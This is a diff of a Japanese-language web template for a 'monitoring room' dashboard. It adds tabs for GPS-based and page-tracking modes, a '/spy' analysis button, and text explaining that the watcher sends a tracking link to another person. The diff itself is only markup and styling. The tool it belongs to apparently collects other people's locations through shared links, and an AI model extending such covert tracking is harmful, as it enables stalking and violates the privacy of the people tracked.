@@ -21,9 +21,21 @@ a.btn,button.mini{padding:6px 12px;border-radius:8px;background:#2b3346;color:#e
 input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#9aa3b2}
 .live{color:#7ee08a;font-weight:700;font-size:12px}
 .warn{color:#f0b429;font-size:12px}
+
+/* タブ */
+.tabs{display:flex;gap:6px;margin:6px 0 14px;flex-wrap:wrap}
+.tabs a{padding:8px 16px;border-radius:999px;background:#20242e;border:1px solid #39415a;
+  color:#c7cddb;text-decoration:none;font-size:13px}
+.tabs a.on{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:600}
 </style></head><body>
 
-<h1>監視室</h1>
+<div class="tabs">
+  <a href="{{ base }}/gp" class="on">🆕 新式（GPS）</a>
+  <a href="{{ base }}/tracks">🗄 旧式（ページ追跡）</a>
+  <a href="{{ base }}/tracking">切替</a>
+</div>
+
+<h1>監視室（新式）</h1>
 <p class="dim">ここは<b>あなた（見る側）</b>の画面です。相手に送るのは
   <span class="mono">{{ base }}/g/コード</span> のほう。
   <span class="mono">{{ base }}/gp/コード</span>（この監視室）は要ログインなので、
@@ -61,6 +73,7 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
     </div>
     <div class="row">
       <a class="btn" href="{{ r.watch }}">監視室</a>
+      <a class="btn" href="{{ r.watch }}/spy">解析</a>
       <a class="btn" href="{{ r.share }}" target="_blank">開く（相手の画面）</a>
       <form method="post" action="/gp/{{ r.code }}/delete" style="margin:0"
             onsubmit="return confirm('削除しますか？')"><button class="mini" type="submit">削除</button></form>
@@ -77,7 +90,8 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
 document.querySelectorAll('.cp').forEach(function (b) {
   b.addEventListener('click', function () {
     var u = b.getAttribute('data-url') || '';
-    function done() { b.textContent = 'コピーしました'; setTimeout(function () { b.textContent = '送るURLをコピー'; }, 1500); }
+    function done() { b.textContent = 'コピーしました';
+      setTimeout(function () { b.textContent = '送るURLをコピー'; }, 1500); }
     function fb() {
       try { var t = document.createElement('textarea'); t.value = u;
             t.style.cssText = 'position:fixed;left:-9999px'; document.body.appendChild(t);
